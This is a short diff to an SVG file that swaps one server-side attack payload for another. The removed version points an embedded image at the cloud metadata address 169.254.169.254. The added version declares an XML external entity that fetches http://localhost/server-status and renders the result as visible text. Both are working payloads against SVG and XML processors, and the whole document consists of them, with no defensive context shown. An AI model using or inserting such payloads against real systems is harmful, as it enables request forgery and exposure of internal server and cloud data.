@@ -1,3 +1,16 @@
-<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <image xlink:href="http://169.254.169.254/" width="200" height="200" />
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://localhost/server-status">
+]>
+<svg width="1200" height="800" xmlns="http://www.w3.org/2000/svg">
+  <style>
+    text {
+      font-family: monospace;
+      font-size: 12px;
+      white-space: pre; /* This is important to preserve formatting */
+    }
+  </style>
+  <text x="10" y="20">
+    &xxe;
+  </text>
 </svg>
